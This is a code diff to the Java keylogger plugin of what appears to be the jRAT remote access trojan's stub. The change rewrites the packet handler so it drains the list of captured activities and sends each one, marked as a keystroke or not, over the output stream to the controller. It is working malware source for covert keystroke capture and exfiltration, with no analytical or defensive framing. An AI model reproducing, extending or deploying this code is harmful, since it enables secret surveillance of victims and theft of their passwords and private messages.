@@ -2,6 +2,7 @@ package pro.jrat.stub.keylogger;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.util.Random;
 
 import org.jnativehook.GlobalScreen;
 
@@ -55,21 +56,28 @@ public class Plugin extends StubPlugin {
 	
 	public void onPacket(byte header) throws Exception {
 		if (header == STATUS_HEADER) {
-			System.out.println("OnPacket: " + header);
-			Activities.pump(dos);		
+			dos.writeByte(STATUS_HEADER);
+			
+			int size = Activities.activities.size();
+						
+			dos.writeInt(size);
+			System.out.println("Wrote length: " + size);
+			
+			
+			for (int i = 0; i < size; i++) {
+				Activity activity = Activities.activities.remove(0);
+				try {
+					dos.writeBoolean(activity instanceof Key);
+					activity.write(dos);
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}	
 		}
 	}
 	
 	public String getVersion() {
 		return "1.0";
-	}
-
-	public static synchronized void writeChars(char[] s) throws Exception {
-		if (s.length > 1) {
-			dos.writeUTF(new String(s));
-		} else {
-			dos.writeChar(s[0]);
-		}
 	}
 
 	@Override
